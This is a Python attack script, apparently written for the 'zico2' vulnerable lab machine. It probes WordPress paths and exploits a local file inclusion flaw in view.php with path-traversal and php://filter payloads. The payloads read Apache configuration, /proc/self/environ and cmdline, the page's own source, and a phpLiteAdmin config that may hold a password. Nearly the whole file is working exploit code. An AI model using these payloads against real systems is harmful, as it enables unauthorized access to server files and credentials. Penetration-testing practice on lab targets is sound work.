#!/usr/bin/env python3
"""zico2 - Find web root and WordPress location"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'

# Try various WordPress paths
print('=== Finding WordPress ===')
wp_paths = [
    '/wordpress/', '/wp/', '/blog/', '/news/', '/wordpress/wp-login.php',
    '/wp-login.php', '/blog/wp-login.php',
]
for p in wp_paths:
    r = s.get(f'{BASE}{p}', timeout=8)
    if r.status_code == 200 and len(r.text) > 100:
        title = re.search(r'<title>([^<]+)</title>', r.text)
        print(f'  {p}: {r.status_code} ({len(r.text)}B) Title={title.group(1) if title else "?"}')

# Find web root via LFI with relative paths
print('\n=== LFI to find web root ===')
# view.php is at /var/www/html/view.php (likely)
# Try to find what directory view.php is in
# by reading Apache config or using proc
lfi_tests = [
    # Read Apache config to find DocumentRoot
    ('../../../../../etc/apache2/sites-enabled/000-default', 'Apache sites'),
    ('../../../../../etc/apache2/apache2.conf', 'Apache conf'),
    ('../../../../../etc/apache2/ports.conf', 'Apache ports'),
    ('../../../../../../etc/apache2/sites-enabled/000-default', 'Apache sites deeper'),
    # Read view.php source itself to understand include path
    ('php://filter/convert.base64-encode/resource=view', 'view.php source'),
    # /proc/self/environ for web root
    ('../../../../../proc/self/environ', 'proc environ'),
    # /proc/self/cmdline for apache process
    ('../../../../../proc/self/cmdline', 'proc cmdline'),
]

import base64
for payload, desc in lfi_tests:
    r = s.get(f'{BASE}/view.php?page={payload}', timeout=10)
    clean = re.sub(r'<[^>]+>', '', r.text).strip()
    if len(clean) > 20 and 'Hacking' not in clean:
        # Try base64 decode
        try:
            decoded = base64.b64decode(clean).decode('utf-8', errors='ignore')
            if len(decoded) > 50:
                print(f'  [+] {desc} ({len(decoded)}B decoded):')
                print(f'      {decoded[:500]}')
                continue
        except:
            pass
        print(f'  [+] {desc} ({len(clean)}B):')
        print(f'      {clean[:500]}')
    else:
        print(f'  [-] {desc}: empty/blocked')

# Also try to read the test_db.php config
print('\n=== Read phpLiteAdmin config ===')
config_payloads = [
    '../../../etc/phpliteadmin.config.php',
    '../../../../../etc/phpliteadmin.config.php',
    '../../../../../var/www/config/phpliteadmin.config.php',
]
for p in config_payloads:
    r = s.get(f'{BASE}/view.php?page={p}', timeout=10)
    if 'directory' in r.text or '$password' in r.text or '$' in r.text:
        print(f'  [+] Found config via {p}!')
        # Extract directory
        d = re.search(r'\$directory\s*=\s*["\']([^"\']+)["\']', r.text)
        if d:
            print(f'      $directory = {d.group(1)}')
        clean = re.sub(r'<[^>]+>', '', r.text).strip()
        print(f'      Content: {clean[:300]}')
        break
